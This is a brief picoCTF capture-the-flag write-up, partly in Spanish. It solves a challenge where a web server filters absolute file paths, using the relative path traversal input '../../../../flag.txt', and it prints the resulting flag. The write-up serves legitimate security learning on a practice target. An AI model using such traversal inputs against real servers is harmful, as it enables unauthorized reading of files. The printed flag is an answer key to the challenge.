


## Objetivo
Can you get the flag?Here's the [website](http://saturn.picoctf.net:64403/).We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
## Solución
Usamos un path relativo empezando de /usr/share/nginx/html/ hasta llegar a /flag.txt
../../../../flag.txt
picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}
## Notas adicionales

## Referencias
